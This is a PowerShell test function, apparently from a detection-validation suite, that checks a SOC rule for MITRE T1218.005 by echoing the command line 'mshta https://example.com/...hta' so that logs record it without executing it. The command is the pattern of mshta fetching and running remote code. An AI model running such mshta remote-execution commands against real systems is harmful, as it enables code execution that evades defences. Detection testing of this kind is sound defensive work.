﻿#Requires -Version 5.1
# Test-SOC1050 :: MSHTA suspicious network cmdline (mshta + ://)
# MITRE T1218.005 (Defense Evasion)  |  kind=echo  |  BENIGN validation
function Test-SOC1050 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'mshta https://example.com/ATRVAL_%RID%.hta'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1050' 'MSHTA suspicious network cmdline (mshta + ://)' 'Defense Evasion' 'T1218.005' $status $detail $marker)
}
